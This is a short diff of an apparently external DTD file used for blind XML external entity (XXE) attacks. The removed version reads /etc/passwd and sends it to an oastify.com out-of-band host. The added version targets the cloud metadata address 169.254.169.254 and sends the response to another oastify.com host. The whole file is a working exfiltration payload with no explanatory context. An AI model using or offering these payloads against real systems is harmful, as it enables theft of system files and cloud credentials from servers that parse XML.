@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "/etc/passwd">
-<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://9oywa1mpv2w2qs80sxop2ekw7nde15pu.oastify.com/?d=%data;'>">
+<!ENTITY % data SYSTEM "http://169.254.169.254/">
+<!ENTITY % final "<!ENTITY exfil SYSTEM 'http://plec7hj5sitin85gpdl5zuhc43avylma.oastify.com/?d=%data;'>">
